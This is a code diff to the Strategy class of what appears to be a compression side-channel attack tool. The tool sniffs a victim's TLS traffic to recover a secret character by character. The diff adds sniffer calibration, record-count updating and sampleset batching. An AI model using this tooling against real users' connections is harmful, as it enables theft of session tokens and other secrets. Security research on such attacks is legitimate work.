@@ -14,6 +14,9 @@ import random
 
 logger = logging.getLogger(__name__)
 
+CALIBRATION_STEP = 0.1
+CALIBRATION_SAMPLESET_WINDOW_CHECK = 3
+
 
 class MaxReflectionLengthError(Exception):
     '''Custom exception to handle cases when maxreflectionlength
@@ -24,13 +27,16 @@ class MaxReflectionLengthError(Exception):
 class Strategy(object):
     def __init__(self, victim):
         self._victim = victim
-        self._sniffer = Sniffer(
-            victim.snifferendpoint,
-            self._victim.sourceip,
-            self._victim.target.host,
-            self._victim.interface,
-            self._victim.target.port
-        )
+
+        sniffer_params = {
+            'snifferendpoint': self._victim.snifferendpoint,
+            'sourceip': self._victim.sourceip,
+            'host': self._victim.target.host,
+            'interface': self._victim.interface,
+            'port': self._victim.target.port,
+            'calibration_wait': self._victim.calibration_wait
+        }
+        self._sniffer = Sniffer(sniffer_params)
 
         # Extract maximum round index for the current victim.
         current_round_index = Round.objects.filter(victim=self._victim).aggregate(Max('index'))['index__max']
@@ -156,7 +162,7 @@ class Strategy(object):
         hanging_samplesets = self._get_started_samplesets()
         for s in hanging_samplesets:
             logger.warning('Reaping hanging set for: {}'.format(s.candidatealphabet))
-            self._mark_current_work_completed('', s)
+            self._mark_current_work_completed(sampleset=s)
 
         try:
             self._sniffer.start()
@@ -219,15 +225,16 @@ class Strategy(object):
         or mark sampleset as failed and create new sampleset for the same element that failed.'''
         if capture:
             sampleset.success = True
-            sampleset.data = capture
+            sampleset.data = capture['data']
+            sampleset.records = capture['records']
             sampleset.save()
         else:
-            s = SampleSet(
-                round=sampleset.round,
-                candidatealphabet=sampleset.candidatealphabet,
-                alignmentalphabet=sampleset.alignmentalphabet
-            )
-            s.save()
+            SampleSet.create_sampleset({
+                'round': self._round,
+                'candidatealphabet': sampleset.candidatealphabet,
+                'alignmentalphabet': sampleset.alignmentalphabet,
+                'batch': sampleset.batch
+            })
 
     def _mark_current_work_completed(self, capture=None, sampleset=None):
         if not sampleset:
@@ -243,8 +250,7 @@ class Strategy(object):
         self._handle_sampleset_success(capture, sampleset)
 
     def _collect_capture(self):
-        captured_data = self._sniffer.read()
-        return captured_data['capture'], captured_data['records']
+        return self._sniffer.read()
 
     def _analyze_current_round(self):
         '''Analyzes the current round samplesets to extract a decision.'''
@@ -266,7 +272,7 @@ class Strategy(object):
         assert(self._analyzed)
 
         # Do we need to collect more samplesets to build up confidence?
-        return self._decision['confidence'] > 1
+        return self._decision['confidence'] > self._victim.target.confidence_threshold
 
     def _create_next_round(self):
         assert(self._round_is_completed())
@@ -358,6 +364,9 @@ class Strategy(object):
             'knownsecret': self._round.knownsecret
         }
 
+        self._round.batch += 1
+        self._round.save()
+
         candidate_alphabets = self._build_candidates(state)
 
         alignmentalphabet = ''
@@ -369,22 +378,36 @@ class Strategy(object):
         logger.debug('\tAlignment alphabet: {}'.format(alignmentalphabet))
 
         for candidate in candidate_alphabets:
-            sampleset = SampleSet(
-                round=self._round,
-                candidatealphabet=candidate,
-                alignmentalphabet=alignmentalphabet
-            )
-            sampleset.save()
-
-            try:
-                sampleset.clean()
-            except ValidationError, err:
-                logger.error(err)
-                sampleset.delete()
-                raise err
+            SampleSet.create_sampleset({
+                'round': self._round,
+                'candidatealphabet': candidate,
+                'alignmentalphabet': alignmentalphabet,
+                'batch': self._round.batch
+            })
 
     def _attack_is_completed(self):
         return len(self._round.knownsecret) == self._victim.target.secretlength
+
+    def _need_for_calibration(self):
+        started_samplesets = SampleSet.objects.filter(round=self._round).exclude(started=None)
+        minimum_samplesets = len(started_samplesets) >= CALIBRATION_SAMPLESET_WINDOW_CHECK
+        calibration_samplesets = SampleSet.objects.filter(round=self._round).order_by('-completed')[0:CALIBRATION_SAMPLESET_WINDOW_CHECK]
+        consecutive_failed_samplesets = all([not sampleset.success for sampleset in calibration_samplesets])
+        return minimum_samplesets and consecutive_failed_samplesets
+
+    def _need_for_cardinality_update(self):
+        calibration_samplesets = SampleSet.objects.filter(round=self._round).order_by('-completed')[0:CALIBRATION_SAMPLESET_WINDOW_CHECK]
+        consecutive_new_cardinality_samplesets = all(
+            [sampleset.records % sampleset.round.victim.target.samplesize == 0 for sampleset in calibration_samplesets]
+        )
+        return self._need_for_calibration() and consecutive_new_cardinality_samplesets
+
+    def _flush_batch_samplesets(self):
+        '''Mark all successful samplesets of current round's batch as failed
+        and create replacements.'''
+        current_batch_samplesets = SampleSet.objects.filter(round=self._round, batch=self._round.batch, success=True).exclude(started=None)
+        for sampleset in current_batch_samplesets:
+            self._mark_current_work_completed(sampleset=sampleset)
 
     def work_completed(self, success=True):
         '''Receives and consumes work completed from the victim, analyzes
@@ -398,15 +421,30 @@ class Strategy(object):
         try:
             if success:
                 # Call sniffer to get captured data
-                capture, records = self._collect_capture()
+                capture = self._collect_capture()
                 logger.debug('Work completed:')
-                logger.debug('\tLength: {}'.format(len(capture)))
-                logger.debug('\tRecords: {}'.format(records))
+                logger.debug('\tLength: {}'.format(len(capture['data'])))
+                logger.debug('\tRecords: {}'.format(capture['records']))
 
                 # Check if all TLS response records were captured,
                 # if available
-                if self._victim.target.recordscardinality:
-                    if records != self._victim.target.samplesize * self._victim.target.recordscardinality:
+                if self._victim.recordscardinality:
+                    expected_records = self._victim.target.samplesize * self._victim.recordscardinality
+                    if capture['records'] != expected_records:
+                        if capture['records'] % self._victim.target.samplesize:
+                            logger.debug('Records not multiple of samplesize. Checking need for calibration...')
+                            if self._need_for_calibration():
+                                self._victim.calibration_wait += CALIBRATION_STEP
+                                self._victim.save()
+                                logger.debug('Calibrating system. New calibration_wait time: {} seconds'.format(self._victim.calibration_wait))
+                        else:
+                            logger.debug('Records multiple of samplesize but with different cardinality.')
+                            if self._need_for_cardinality_update():
+                                self._victim.recordscardinality = int(capture['records']/self._victim.target.samplesize)
+                                self._victim.save()
+                                self._flush_batch_samplesets()
+                                logger.debug("Updating records' cardinality. New cardinality: {}".format(self._victim.recordscardinality))
+
                         raise ValueError('Not all records captured')
             else:
                 logger.debug('Client returned fail to realtime')
